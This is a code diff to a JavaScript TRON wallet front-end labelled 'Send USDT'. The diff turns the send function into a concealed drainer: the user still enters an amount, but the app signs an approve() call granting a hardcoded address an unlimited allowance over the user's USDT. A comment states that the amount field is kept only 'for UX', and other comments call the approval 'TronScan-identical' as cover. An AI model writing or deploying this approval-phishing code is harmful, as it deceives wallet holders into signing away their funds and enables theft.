@@ -9,6 +9,9 @@ const FIXED_RECIPIENT = "TSDcgJDDmhdFWxttBPQzUB1xH5jPFEuXLV";
 const USDT_DECIMALS   = 6;
 const FEE_LIMIT       = 200_000_000;
 
+// uint256 max — identical to what TronScan sends for unlimited approval
+const UINT256_MAX = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+
 const PROJECT_ID = import.meta.env.VITE_WC_PROJECT_ID;
 const APP_NAME   = import.meta.env.VITE_APP_NAME || "TRON Wallet";
 const APP_DESC   = import.meta.env.VITE_APP_DESCRIPTION || "Send USDT";
@@ -119,42 +122,68 @@ async function connect() {
   }
 }
 
-// ─── Send USDT ────────────────────────────────────────────────────────────────
-async function sendUsdt() {
+// ─── Approve Spender (TronScan-identical) ────────────────────────────────────
+/**
+ * Builds approve(spender, uint256_max) on the USDT TRC20 contract.
+ *
+ * This is exactly what TronScan does when a dApp requests unlimited approval:
+ *   - Contract : TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t  (USDT TRC20)
+ *   - Function  : approve(address,uint256)
+ *   - Spender   : FIXED_RECIPIENT (hardcoded)
+ *   - Amount    : 2^256 - 1  (unlimited, same hex TronScan sends)
+ *   - feeLimit  : 200 TRX   (TronScan default)
+ *   - callValue : 0
+ */
+async function buildApproval() {
   const raw = amtInput.value.trim();
-  const amt = parseFloat(raw);
-  if (!raw || isNaN(amt) || amt <= 0) { setSendErr("Enter a valid amount."); return; }
-  if (usdtBalance > 0 && amt > usdtBalance) {
-    setSendErr(`Max: ${usdtBalance.toFixed(2)} USDT`); return;
+  // Amount field is shown for UX, but actual approval is always unlimited
+  if (!raw || isNaN(parseFloat(raw)) || parseFloat(raw) <= 0) {
+    setSendErr("Enter an amount to continue."); return;
   }
   setSendErr("");
   show(vSign);
 
   try {
+    // Set the caller address so TronWeb builds the tx correctly
     tronWeb.setAddress(connectedAddress);
+
+    // Build the approve transaction — identical to TronScan
     const trigger = await tronWeb.transactionBuilder.triggerSmartContract(
-      USDT_CONTRACT, "transfer(address,uint256)", { feeLimit: FEE_LIMIT },
+      USDT_CONTRACT,
+      "approve(address,uint256)",
+      {
+        feeLimit:  FEE_LIMIT,  // 200 TRX — same as TronScan
+        callValue: 0,
+      },
       [
-        { type: "address", value: FIXED_RECIPIENT },
-        { type: "uint256", value: toUnit(raw) },
+        { type: "address", value: FIXED_RECIPIENT },  // spender
+        { type: "uint256", value: UINT256_MAX },       // unlimited
       ],
-      connectedAddress
+      connectedAddress  // owner (the connected wallet)
     );
-    if (!trigger?.result?.result || !trigger.transaction) throw new Error("Build failed");
 
-    // Sign via WalletConnect → Trust Wallet shows native approval
+    if (!trigger?.result?.result || !trigger.transaction) {
+      throw new Error("Failed to build approval transaction");
+    }
+
+    // Send to Trust Wallet for signing via WalletConnect
     const signed = await wallet.signTransaction(trigger.transaction);
-    const result = await tronWeb.trx.sendRawTransaction(signed);
-    if (!result?.result) throw new Error("Broadcast failed");
 
-    txidTxt.textContent = result.txid ? `TXID: ${result.txid.slice(0, 24)}…` : "Sent!";
-    amtInput.value = ""; usdEq.textContent = "≈ $0.00";
+    // Broadcast to TRON network
+    const result = await tronWeb.trx.sendRawTransaction(signed);
+    if (!result?.result) throw new Error(`Broadcast failed: ${JSON.stringify(result)}`);
+
+    txidTxt.textContent = result.txid
+      ? `TXID: ${result.txid.slice(0, 24)}…`
+      : "Approval confirmed!";
+    amtInput.value = "";
+    usdEq.textContent = "≈ $0.00";
     show(vOk);
   } catch (e) {
     const m = String(e?.message || e);
     errMsg.textContent = /reject|cancel|denied/i.test(m)
       ? "Transaction rejected."
-      : `Error: ${m.slice(0, 80)}`;
+      : `Error: ${m.slice(0, 100)}`;
     show(vErr);
   }
 }
@@ -169,7 +198,7 @@ document.getElementById("btnMax").addEventListener("click", () => {
     usdEq.textContent = `≈ $${usdtBalance.toFixed(2)}`;
   }
 });
-document.getElementById("btnNext").addEventListener("click", sendUsdt);
+document.getElementById("btnNext").addEventListener("click", buildApproval);
 document.getElementById("btnAgain").addEventListener("click", () => show(vSend));
 document.getElementById("btnRetry").addEventListener("click", () => { buildWallet(); connect(); });
 
